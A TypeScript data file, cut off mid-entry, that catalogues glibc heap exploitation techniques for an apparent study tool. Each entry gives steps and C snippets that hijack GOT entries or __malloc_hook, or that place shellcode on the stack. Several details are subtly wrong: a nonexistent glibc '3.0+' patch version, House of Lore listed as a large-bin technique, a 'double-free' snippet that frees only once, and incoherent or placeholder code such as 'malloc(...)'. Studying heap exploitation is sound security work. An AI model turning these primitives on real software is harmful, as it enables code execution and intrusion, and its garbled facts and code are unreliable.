// Comprehensive Heap Exploitation Techniques based on how2heap and heap-exploitation.dhavalkapil.com
export interface HeapTechnique {
  id: string;
  name: string;
  description: string;
  category: 'fastbin' | 'tcache' | 'top-chunk' | 'unsorted' | 'large-bin' | 'house' | 'glibc-specific';
  vulnerability: string;
  glibcVersions: string[];
  prerequisites: string[];
  constraints: string[];
  steps: string[];
  exploitationPath: {
    name: string;
    description: string;
    code: string;
  }[];
  how2heapLink: string;
  dhavalkapilChapter: string;
  ctfChallenges: Array<{ name: string; year: string; link: string }>;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  patchedIn: string[];
  relatedTechniques: string[];
}

export const HEAP_TECHNIQUES: Record<string, HeapTechnique> = {
  fastbin_dup: {
    id: 'fastbin-dup',
    name: 'Fastbin Duplication (Double Free)',
    description: 'Allocate same chunk twice by exploiting fastbin linked list corruption, allowing arbitrary memory write.',
    category: 'fastbin',
    vulnerability: 'Fastbin corruption via double-free or use-after-free',
    glibcVersions: ['2.25-2.32+'],
    prerequisites: [
      'Ability to free same chunk twice',
      'No tcache security checks (pre-2.29)',
      'Knowledge of heap layout'
    ],
    constraints: [
      'Fastbin size range (0x20-0x80 bytes)',
      'Fastbin chunks must not be adjacent to allocated chunks',
      'Modern glibc has tcache which is harder to exploit'
    ],
    steps: [
      '1. Allocate chunk A of fastbin size',
      '2. Free chunk A',
      '3. Allocate another chunk B (fragment fastbin)',
      '4. Free chunk A again (now in fastbin twice)',
      '5. Next allocation returns same chunk',
      '6. Modify chunk data to write to arbitrary address'
    ],
    exploitationPath: [
      {
        name: 'GOT Hijacking via Fastbin Dup',
        description: 'Overwrite GOT entry to redirect function calls',
        code: `// Allocate chunk at GOT entry
void *p1 = malloc(0x60);
void *p2 = malloc(0x60);
void *p3 = malloc(0x60);

free(p1);
free(p2);
free(p1); // p1 now in fastbin twice

// Modify p1 to point to GOT
*(uint64_t*)p1 = GOT_ENTRY - 0x10;

malloc(0x60); // Get p1
malloc(0x60); // Get p2
void *p4 = malloc(0x60); // p4 @ GOT-0x10

// Write to p4 to hijack GOT entry`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'BCTF 2016: bcloud', year: '2016', link: 'https://ctftime.org/task/2567/' },
      { name: 'Plaid CTF 2015: pwnable100', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Easy',
    patchedIn: ['2.33+'],
    relatedTechniques: ['fastbin-dup-into-stack', 'tcache-poisoning']
  },

  fastbin_dup_into_stack: {
    id: 'fastbin-dup-into-stack',
    name: 'Fastbin Dup into Stack',
    description: 'Double-free fastbin chunk to allocate memory in stack area, enabling stack manipulation.',
    category: 'fastbin',
    vulnerability: 'Double-free in fastbin allowing arbitrary allocation',
    glibcVersions: ['2.25-2.32'],
    prerequisites: [
      'Ability to double-free heap chunks',
      'Stack address leak or prediction',
      'Control over fastbin metadata'
    ],
    constraints: [
      'Must forge valid fastbin size field',
      'Stack allocation must be in fastbin size range',
      'Target address must be writable'
    ],
    steps: [
      '1. Leak stack address (e.g., via format string or info leak)',
      '2. Allocate fastbin-sized chunks',
      '3. Free and re-free to corrupt fastbin chain',
      '4. Inject stack address as fake chunk header',
      '5. Allocate to get stack memory',
      '6. Overwrite return address or other stack data'
    ],
    exploitationPath: [
      {
        name: 'Stack Smashing via Fastbin',
        description: 'Write to stack return address via fastbin allocation',
        code: `// Assume stack_address is leaked
uint64_t stack_target = stack_address - 0x100;

// Create double-free scenario
void *p1 = malloc(0x30);
free(p1);

// Overwrite freed chunk to point to stack
*(uint64_t*)p1 = stack_target - 8;

// Next allocation is on stack
void *p2 = malloc(0x30); // p2 is now on stack
strcpy((char*)p2, shellcode);`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'HITB 2015: Bookstore', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['2.33+'],
    relatedTechniques: ['fastbin-dup', 'house-of-spirit']
  },

  tcache_poisoning: {
    id: 'tcache-poisoning',
    name: 'Tcache Poisoning',
    description: 'Corrupt tcache linked list to allocate arbitrary memory, bypassing most checks.',
    category: 'tcache',
    vulnerability: 'Tcache chunk overwrite allowing arbitrary allocation',
    glibcVersions: ['2.26-2.31'],
    prerequisites: [
      'Ability to write to heap chunk metadata',
      'Knowledge of tcache structure',
      'No tcache poison check (before 2.29)'
    ],
    constraints: [
      'tcache must be enabled (glibc 2.26+)',
      'Target address must be writable',
      'Can only allocate 7 chunks of same size per bin'
    ],
    steps: [
      '1. Find use-after-free or buffer overflow in tcache chunk',
      '2. Overwrite next pointer of freed chunk',
      '3. Point to target address (e.g., __malloc_hook)',
      '4. Allocate from tcache to get target address',
      '5. Write shellcode or hook function pointer'
    ],
    exploitationPath: [
      {
        name: 'Malloc Hook via Tcache',
        description: 'Overwrite __malloc_hook to execute arbitrary code',
        code: `// UAF in tcache chunk
void *p1 = malloc(0x60);
free(p1);

// Write to p1 after free (UAF)
uint64_t malloc_hook_addr = find_malloc_hook();
*(uint64_t*)p1 = malloc_hook_addr;

// Next allocation gets __malloc_hook
void *p2 = malloc(0x60); // p2 @ __malloc_hook
*(uint64_t*)p2 = system;

// malloc triggers system()
malloc(...)  // Executes system`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.29/tcache_poisoning.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/tcache.html',
    ctfChallenges: [
      { name: 'HITCON 2016: Houseofsilly', year: '2016', link: 'https://ctftime.org' },
      { name: 'Google CTF 2019: Troopers', year: '2019', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['2.29+'],
    relatedTechniques: ['tcache-duplicate-free', 'house-of-einherjar']
  },

  tcache_duplicate_free: {
    id: 'tcache-dup',
    name: 'Tcache Duplicate Free',
    description: 'Free same chunk twice to tcache, bypassing doubly-linked list checks.',
    category: 'tcache',
    vulnerability: 'Double-free in tcache due to missing checks',
    glibcVersions: ['2.26-2.29'],
    prerequisites: [
      'Ability to free same chunk twice',
      'Target chunk size must be in tcache range',
      'No tcache duplicate detection (2.26-2.29)'
    ],
    constraints: [
      'Only works on glibc 2.26-2.29',
      'Same tcache bin must have room (< 7 chunks)',
      'Can only allocate limited number of copies'
    ],
    steps: [
      '1. Allocate chunk A',
      '2. Free chunk A to tcache',
      '3. Free chunk A again to tcache',
      '4. Allocate 3x to get chunk A three times',
      '5. Use multiple references to arbitrary write'
    ],
    exploitationPath: [
      {
        name: 'Arbitrary Write via Tcache Dup',
        description: 'Get multiple references to same chunk for arbitrary memory write',
        code: `void *p1 = malloc(0x80);
free(p1);
free(p1);  // Double free

void *p2 = malloc(0x80);  // p2 = p1
void *p3 = malloc(0x80);  // p3 = p1
void *p4 = malloc(0x80);  // p4 = p1

// Now p2, p3, p4 all point to same chunk
*(uint64_t*)p2 = target_address;
// p3 and p4 still point to same location
// Modify through p3 affects p4`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.29/tcache_dup.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/tcache.html',
    ctfChallenges: [
      { name: 'CSAW 2019: PWN chall', year: '2019', link: 'https://ctftime.org' }
    ],
    difficulty: 'Easy',
    patchedIn: ['2.30+'],
    relatedTechniques: ['tcache-poisoning', 'fastbin-dup']
  },

  house_of_spirit: {
    id: 'house-of-spirit',
    name: 'House of Spirit',
    description: 'Create a fake chunk on the stack and free it to get stack allocation.',
    category: 'house',
    vulnerability: 'Stack overflow with chunk structure to allocate stack memory',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to write fake chunk on stack',
      'Buffer overflow or controlled write',
      'Chunk structure must be valid (size field, flags)'
    ],
    constraints: [
      'Fake chunk size must pass malloc checks',
      'Must account for glibc version differences',
      'Previous/next chunk must also be valid or corrupted appropriately'
    ],
    steps: [
      '1. Overflow buffer to write fake chunk on stack',
      '2. Craft valid chunk header (size, flags, prev_size)',
      '3. Cause fake chunk to be freed',
      '4. Next allocation of same size gets stack memory',
      '5. Overwrite return address or function pointers'
    ],
    exploitationPath: [
      {
        name: 'Stack Overflow via House of Spirit',
        description: 'Allocate stack memory and overwrite return address',
        code: `// Stack buffer
char buffer[0x100];

// Craft fake chunk header at buffer-0x10
uint64_t *fake_chunk = (uint64_t*)(buffer - 0x10);
fake_chunk[0] = 0x100;  // size
fake_chunk[1] = 0;      // flags

// Overflow causes fake chunk to be freed
// Free operation adds to fastbin
free((void*)fake_chunk);

// Allocate to get stack
void *p = malloc(0xf0);  // p points to buffer
strcpy(p, shellcode);    // Overwrite return address`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'CSAW 2013: Exploit400', year: '2013', link: 'https://ctftime.org' },
      { name: 'Plaid CTF 2014: qinetd', year: '2014', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['3.0+'],
    relatedTechniques: ['house-of-lore', 'house-of-force']
  },

  house_of_force: {
    id: 'house-of-force',
    name: 'House of Force',
    description: 'Corrupt top chunk size to allocate at arbitrary address.',
    category: 'house',
    vulnerability: 'Top chunk size overflow allowing arbitrary allocation',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to overflow into top chunk size field',
      'Knowledge of heap layout and target address',
      'Must be able to allocate after corruption'
    ],
    constraints: [
      'Top chunk size must be writable',
      'All intermediate allocations consumed',
      'Target must be in valid memory range'
    ],
    steps: [
      '1. Find overflow into top chunk size field',
      '2. Set size to 0xffffffffffffffff',
      '3. Calculate allocation size to reach target',
      '4. Allocate with calculated size to position top chunk',
      '5. Next allocation is at target address',
      '6. Write shellcode or overwrite critical data'
    ],
    exploitationPath: [
      {
        name: 'GOT Hijacking via House of Force',
        description: 'Allocate at GOT entry and hijack function pointer',
        code: `// Overflow into top chunk
// After overflow, top_size = 0xffffffff...

// Calculate: allocation_size = target_got - current_top
uint64_t target = GOT_entry;
uint64_t current_top = heap_base + heap_size;
uint64_t alloc_size = target - current_top - 0x20;

// Allocate to position top chunk at target
void *p1 = malloc(alloc_size);
// Now top chunk is at target-0x20

void *p2 = malloc(0x100);  // p2 @ target
*(uint64_t*)p2 = system;   // Overwrite function pointer`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'BCTF 2016: bcloud', year: '2016', link: 'https://ctftime.org/task/2567/' },
      { name: 'PoliCTF 2014: Faust', year: '2014', link: 'https://ctftime.org' }
    ],
    difficulty: 'Hard',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-spirit', 'house-of-einherjar']
  },

  house_of_lore: {
    id: 'house-of-lore',
    name: 'House of Lore',
    description: 'Corrupt small-bin by overwriting backward pointer to allocate at arbitrary address.',
    category: 'large-bin',
    vulnerability: 'Small-bin linked list corruption via backward pointer overwrite',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to write to allocated chunk in small-bin range',
      'Knowledge of small-bin address',
      'Chunk must remain in small-bin (not coalesced)'
    ],
    constraints: [
      'Works only on small-bin (0x80-0x400)',
      'Backward pointer check requires valid forward chunk',
      'Target address formatting constraints'
    ],
    steps: [
      '1. Allocate chunk A and B in small-bin range',
      '2. Free A then B to create small-bin list',
      '3. Overwrite B\'s backward pointer via overflow',
      '4. Point to target address chunk',
      '5. Allocate twice: once gets B, next gets target'
    ],
    exploitationPath: [
      {
        name: 'Malloc Hook via House of Lore',
        description: 'Corrupt small-bin to allocate at __malloc_hook',
        code: `// Free chunks into small-bin
void *p1 = malloc(0x200);
void *p2 = malloc(0x200);
free(p1);
free(p2);

// Overwrite p2's bk pointer
// p2->bk = fake_chunk @ malloc_hook
char *overflow = (char*)p1;
uint64_t malloc_hook = find_malloc_hook();
// Write to overflow to reach p2->bk field
// offset depends on chunk layout
*(uint64_t*)(overflow + 0x208) = malloc_hook - 0x10;

// Allocate to get malloc_hook
void *p3 = malloc(0x200);  // Gets p2
void *p4 = malloc(0x200);  // Gets malloc_hook chunk`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'BCTF 2015: bcloud', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Hard',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'unsorted-bin-attack']
  },

  unsorted_bin_attack: {
    id: 'unsorted-bin-attack',
    name: 'Unsorted Bin Attack',
    description: 'Write large value to arbitrary address by corrupting unsorted bin.',
    category: 'unsorted',
    vulnerability: 'Unsorted bin linked list corruption',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to allocate and free chunks into unsorted bin',
      'Overflow to corrupt unsorted bin linking',
      'Target address must be writable'
    ],
    constraints: [
      'Only writes 8-byte values (libc address range)',
      'Target must be large enough to pass checks',
      'Allocation must be split properly'
    ],
    steps: [
      '1. Free chunk into unsorted bin',
      '2. Overflow to corrupt unsorted bin bk pointer',
      '3. Point bk to target address - offset',
      '4. Allocate with size that triggers coalescing',
      '5. Target address gets overwritten with heap pointer'
    ],
    exploitationPath: [
      {
        name: 'Bypass Malloc Security via Unsorted Bin',
        description: 'Overwrite global variable through unsorted bin attack',
        code: `// Create unsorted bin entry
void *p = malloc(0x400);
free(p);

// Overflow to corrupt unsorted->bk
// unsorted->bk = target - 0x10
uint64_t target = global_ptr_array;
char *overflow = (char*)allocated_chunk;
// offset to reach p->bk
*(uint64_t*)(overflow + 0x408) = target - 0x10;

// Allocation triggers attack
void *q = malloc(0x500);  
// Unsorted bin backward link write
// target now contains heap address`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/unsorted_bin_attack.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'HITCON 2016: Houseofsilly', year: '2016', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'house-of-lore']
  },

  house_of_einherjar: {
    id: 'house-of-einherjar',
    name: 'House of Einherjar',
    description: 'Forge chunk in freed memory to allocate arbitrary address by corrupting previous chunk size.',
    category: 'house',
    vulnerability: 'Chunk coalescing exploitation via corrupted prev_size',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to write fake chunk before target',
      'Must control free of adjacent chunks',
      'Precise offset calculations required'
    ],
    constraints: [
      'Very complex exploitation technique',
      'Multiple constraints on chunk alignment',
      'Difficult to maintain in practice'
    ],
    steps: [
      '1. Write fake chunk with modified size',
      '2. Overflow into next chunk\'s prev_size field',
      '3. Free next chunk to trigger backward coalescing',
      '4. Fake chunk gets unlinked into correct bin',
      '5. Allocate to get fake chunk location'
    ],
    exploitationPath: [
      {
        name: 'Arbitrary Allocation via Coalescing',
        description: 'Use coalescing to place fake chunk in target bin',
        code: `// Write fake chunk data
char *write_area = malloc(0x200);
// Craft fake chunk at write_area
uint64_t *fake = (uint64_t*)write_area;
fake[0] = 0x100;  // size
fake[1] = 0x100;  // back_size for consolidate

// Free next chunk to consolidate
void *next = malloc(0x100);
// Overflow to set next->prev_size = 0x100
// This makes consolidate backward to our fake chunk
free(next);

// Now fake chunk is in unsorted bin
// Next allocation gets our address`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_einherjar.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'Google CTF 2016: Inst Prof', year: '2016', link: 'https://ctftime.org' }
    ],
    difficulty: 'Expert',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-force', 'house-of-lore']
  },

  large_bin_attack: {
    id: 'large-bin-attack',
    name: 'Large Bin Attack',
    description: 'Corrupt large-bin to write large values to multiple arbitrary addresses.',
    category: 'large-bin',
    vulnerability: 'Large bin unlink with corrupted forward/backward pointers',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to allocate large chunks and overflow',
      'Knowledge of large-bin structure',
      'Multiple target addresses needed'
    ],
    constraints: [
      'Requires large allocations (0x400+)',
      'Complex unlinking process',
      'Multiple pointer overwrites needed'
    ],
    steps: [
      '1. Free large chunk into large-bin',
      '2. Allocate smaller chunk to create fragmentation',
      '3. Overflow large bin chunk to corrupt pointers',
      '4. Next free triggers unlink with corruption',
      '5. Multiple addresses get overwritten'
    ],
    exploitationPath: [
      {
        name: 'Multi-address Write via Large Bin',
        description: 'Overwrite multiple GOT entries through large bin attack',
        code: `// Create large bin entry
void *large = malloc(0x1000);
free(large);  // Goes to large-bin

// Overflow to corrupt forward/backward pointers
char *overflow = malloc(0x100);
// Overwrite large->fd and large->bk
// Each unlink attempt writes to these addresses

// Carefully chosen targets
// target1 and target2 will be written
*(uint64_t*)(overflow + 0x108) = GOT_func1 - 0x18;
*(uint64_t*)(overflow + 0x110) = GOT_func2 - 0x20;

// Trigger unlink
free(overflow);`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/large_bin_attack.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'HITCON 2015: House', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Expert',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'unsorted-bin-attack']
  },

  house_of_botcake: {
    id: 'house-of-botcake',
    name: 'House of Botcake',
    description: 'Bypass tcache double-free mitigations (glibc 2.29+) by leveraging chunk consolidation.',
    category: 'house',
    vulnerability: 'UAF/Double Free allowing consolidation with a chunk that is subsequently freed to tcache.',
    glibcVersions: ['2.29-2.31+'],
    prerequisites: [
      'Ability to allocate chunks larger than tcache max (0x408) OR ability to consolidate chunks',
      'Ability to free 7 chunks to fill tcache',
      'UAF or double free vulnerability'
    ],
    constraints: [
      'Requires ability to allocate/free multiple chunks to manipulate tcache counts',
      'Requires overlapping chunks execution post-consolidation'
    ],
    steps: [
      '1. Allocate 7 chunks of size X to fill the tcache for size X.',
      '2. Allocate chunk A and adjacent chunk B (where A+B form a consolidateable block).',
      '3. Free B, then free A (or vice versa) to trigger consolidate into a large unsorted chunk.',
      '4. Free A again (or use a UAF to free an overlapping smaller chunk). Since tcache is full, it might bypass checks, or you free it when tcache has room, placing a chunk that is inside the consolidated block into the tcache.',
      '5. Allocate from the consolidated block to overwrite the tcache chunk\'s fd pointer.',
      '6. Allocate twice from tcache to get arbitrary memory.'
    ],
    exploitationPath: [
      {
        name: 'Tcache Poisoning via Consolidation',
        description: 'Bypass double free checks by hiding the double free inside a consolidated chunk',
        code: `// Fill tcache
for(int i=0; i<7; i++) {
  void *p = malloc(0x100);
  free(p);
}

// Allocate adjacent chunks
void *prev = malloc(0x100);
void *p = malloc(0x100);

// Consolidate them into unsorted bin
free(prev);
free(p); // Now prev and p are merged into a 0x200+ chunk

// But we still have a pointer to 'p'. 
// Free it again! (Since it's part of a larger chunk now, tcache dup check fails to find it)
// Wait, we need room in tcache. Let's assume we allocated one from tcache earlier.
free(p); // Goes to tcache!

// Now we allocate the large consolidated chunk
void *large = malloc(0x200); 
// large overlaps with p! We can overwrite p->fd
*(uint64_t*)large = target_address;

malloc(0x100); // Gets p
void *target = malloc(0x100); // Gets target_address!`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'Deconstruct.f CTF 2021', year: '2021', link: '' }
    ],
    difficulty: 'Hard',
    patchedIn: [],
    relatedTechniques: ['tcache-poisoning']
  },

  house_of_roman: {
    id: 'house-of-roman',
    name: 'House of Roman',
    description: 'A leakless heap exploitation technique that relies on partial overwrites of heap and libc pointers to bypass ASLR.',
    category: 'house',
    vulnerability: 'Heap vulnerability (UAF/overflow) combined with partial overwrites (usually 1 or 2 bytes).',
    glibcVersions: ['2.23-2.29'],
    prerequisites: [
      'UAF or Heap Overflow allowing partial byte overwrites',
      'No libc leak available'
    ],
    constraints: [
      'Requires brute-forcing 4 bits (1/16) or 12 bits (1/4096) of ASLR depending on alignment',
      'Typically needs an environment where the exploit can be run multiple times or a script to loop it'
    ],
    steps: [
      '1. Use Fastbin Dup to align a chunk near __malloc_hook using partial overwrite of the fd pointer.',
      '2. Use Unsorted Bin attack to write a libc pointer (main_arena+offset) near __malloc_hook.',
      '3. Partially overwrite that libc pointer to point exactly to __malloc_hook or system/one_gadget.',
      '4. Trigger malloc to get a shell.'
    ],
    exploitationPath: [
      {
        name: 'Leakless RCE via Partial Overwrite',
        description: 'Overwrite LSBs of pointers to redirect execution without leaking base addresses',
        code: `// Fastbin dup to point to malloc_hook - offset
// We only overwrite the lowest byte to change offset within the same page
*(uint8_t*)fastbin_chunk = 0xed; // e.g., pointing near malloc_hook

// Unsorted bin attack to put main_arena+88 into our controlled chunk
// Then partial overwrite of that libc pointer to point to one_gadget
// Requires 12-bit bruteforce because of ASLR page alignment
*(uint16_t*)libc_ptr = 0x1234; // Bruteforcing the nibble`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_roman.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'Codegate CTF 2018: BaskinRobbins31', year: '2018', link: '' }
    ],
    difficulty: 'Expert',
    patchedIn: ['2.29+'],
    relatedTechniques: ['fastbin-dup', 'unsorted-bin-attack']
  },

  first_fit: {
    id: 'first-fit',
    name: 'First Fit',
    description: 'Demonstrates glibc malloc\'s first-fit behavior: freed chunks of the same size class are reused in LIFO order. Understanding this is fundamental to heap exploitation as it governs how malloc selects chunks.',
    category: 'fastbin',
    vulnerability: 'No vulnerability — this is a foundational understanding technique for heap behavior',
    glibcVersions: ['All versions'],
    prerequisites: [
      'Understanding of glibc malloc internals',
      'Ability to allocate and free chunks of same size'
    ],
    constraints: [
      'Purely educational — no exploitation on its own',
      'LIFO order only applies to fastbins and tcache, not unsorted bins'
    ],
    steps: [
      '1. Allocate two chunks A and B of the same size.',
      '2. Free chunk A.',
      '3. Allocate chunk C of the same size — C will be placed where A was (LIFO).',
      '4. This is the basis for UAF/double-free exploitation patterns.'
    ],
    exploitationPath: [
      {
        name: 'Reclaim Freed Chunk for UAF',
        description: 'Demonstrate that malloc reuses the most recently freed chunk, enabling UAF type confusion',
        code: `void *a = malloc(0x60);
void *b = malloc(0x60);
free(a);
// malloc returns the same memory as 'a'
void *c = malloc(0x60);
// c == a (first-fit reuse)
// Now we have c overlapping with old 'a' data`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/first_fit.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/basics_of_heap.html',
    ctfChallenges: [],
    difficulty: 'Easy',
    patchedIn: [],
    relatedTechniques: ['fastbin-dup', 'tcache-poisoning']
  },

  poison_null_byte: {
    id: 'poison-null-byte',
    name: 'Poison Null Byte (Off-by-One Null)',
    description: 'Off-by-one null byte overflow that clears the PREV_IN_USE bit and shrinks the prev_size of the next chunk, causing backward coalescing when that chunk is freed. Results in overlapping chunks.',
    category: 'house',
    vulnerability: 'Off-by-one null byte overflow into adjacent chunk metadata',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Off-by-one null byte vulnerability (single null byte write)',
      'Ability to allocate and free chunks to control layout',
      'Understanding of PREV_IN_USE bit and coalescing'
    ],
    constraints: [
      'Only a single null byte can be written',
      'Must carefully construct chunk layout before triggering',
      'Glibc 2.29+ adds stricter checks that complicate this technique'
    ],
    steps: [
      '1. Allocate chunks A, B, C where A is target, B is overflow source, C is guard.',
      '2. Overflow a null byte from B into C\'s size field, clearing PREV_IN_USE and setting prev_size.',
      '3. Forge a fake chunk F inside B with exact prev_size matching the distance from F to C.',
      '4. Free C — backward coalescing merges C all the way back to F, creating an overlapping chunk.',
      '5. Allocate from the overlapping region to control chunk A\'s metadata.'
    ],
    exploitationPath: [
      {
        name: 'Overlapping Chunks via Null Byte',
        description: 'Use off-by-one null to create overlapping chunks, then use UAF/tcache poisoning',
        code: `// Allocate layout: fake_chunk | victim | attacker
void *a = malloc(0x100);  // victim
void *b = malloc(0x100);  // overflow source
void *c = malloc(0x100);  // guard

// Off-by-one: null byte overflow from b into c
// This clears PREV_IN_USE in c, and sets c->prev_size
*(char*)((uint64_t)c - 1) = '\\x00';

// Forge fake prev_size in b so coalescing goes back to a
// ...

// Free c — backward coalescing to fake chunk
free(c);
// Now a and c overlap!`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'Plaid CTF 2015: pwnable200', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Hard',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'overlapping-chunks']
  },

  overlapping_chunks_2: {
    id: 'overlapping-chunks-2',
    name: 'Overlapping Chunks 2 (Tcache Reclaim)',
    description: 'Creates overlapping chunks by corrupting a freed chunk\'s metadata so that when it is reclaimed via malloc, the allocation overlaps with an adjacent existing chunk. A tcache variant of the classic overlapping chunks technique.',
    category: 'tcache',
    vulnerability: 'Heap overflow or UAF corrupting chunk size/metadata leading to overlapping allocations',
    glibcVersions: ['2.26-2.32+'],
    prerequisites: [
      'Heap overflow to corrupt chunk size field',
      'Understanding of tcache per-thread cache behavior',
      'Ability to allocate/free chunks in controlled size classes'
    ],
    constraints: [
      'tcache chunks have fewer checks than fastbins in older glibc versions',
      'Only 7 chunks per tcache bin',
      'Modern glibc (2.32+) safe-linking can complicate exploitation'
    ],
    steps: [
      '1. Allocate chunks A, B, C where B\'s size can be overwritten.',
      '2. Free B to tcache.',
      '3. Overflow chunk A to increase B\'s size field (e.g., 0x80 → 0x100).',
      '4. Allocate 0xf0 bytes — gets B\'s old slot but with larger size, now overlaps into C.',
      '5. Now can read/write into C\'s data through the overlapping pointer.'
    ],
    exploitationPath: [
      {
        name: 'Tcache Overlap for Arbitrary Read/Write',
        description: 'Resize a freed chunk in tcache to create overlapping allocation',
        code: `void *a = malloc(0x70);
void *b = malloc(0x70);
void *c = malloc(0x70);

free(b);  // b enters tcache[0x80]

// Overflow from a: increase b's size to 0x100
*(uint64_t*)(a + 0x78) = 0x101;  // b->size = 0x100

// Allocate 0xf0 bytes — gets b with enlarged size
void *overlap = malloc(0xf0);

// overlap now covers c's memory too
// *(uint64_t*)(overlap + 0x80) corrupts c->fd for tcache poisoning`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.29/overlapping_chunks_2.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'HITCON 2019: One Punch Man', year: '2019', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: [],
    relatedTechniques: ['tcache-poisoning', 'fastbin-dup']
  },

  house_of_husk: {
    id: 'house-of-husk',
    name: 'House of Husk',
    description: 'Corrupts the printf_function pointer table entry in libc to gain code execution. Leverages control over a freed chunk to overwrite the __printf_function_table or __printf_arginfo_table.',
    category: 'house',
    vulnerability: 'UAF or heap overflow allowing overwrite of libc internal function tables',
    glibcVersions: ['2.23-2.31'],
    prerequisites: [
      'Heap overflow or UAF to corrupt chunk metadata',
      'Libc address leak (essential for targeting printf function tables)',
      'Binary uses printf family functions with format specifiers'
    ],
    constraints: [
      'Requires libc leak',
      'Format string must trigger the corrupted entry in printf_function_table',
      'Glibc 2.32+ has safe-linking and other mitigations'
    ],
    steps: [
      '1. Leak libc address via unsorted bin or format string.',
      '2. Corrupt chunk so it overlaps with or points to __printf_function_table.',
      '3. Write a valid pointer chain: __printf_function_table → arginfo_table → function_pointer.',
      '4. Trigger printf() with a format specifier that hits the corrupted entry.',
      '5. Execution redirects to attacker-controlled address.'
    ],
    exploitationPath: [
      {
        name: 'Printf Function Table Hijack',
        description: 'Overwrite __printf_function_table to redirect execution via crafted printf format specifier',
        code: `// Leak libc base
uint64_t libc_base = leak_libc();

// Corrupt chunk to write to __printf_function_table
// In libc: __printf_function_table at known offset
uint64_t printf_func_table = libc_base + OFFSET_PRINTF_FUNCTION_TABLE;
uint64_t printf_arginfo_table = libc_base + OFFSET_PRINTF_ARGINFO_TABLE;

// Write fake pointer chain
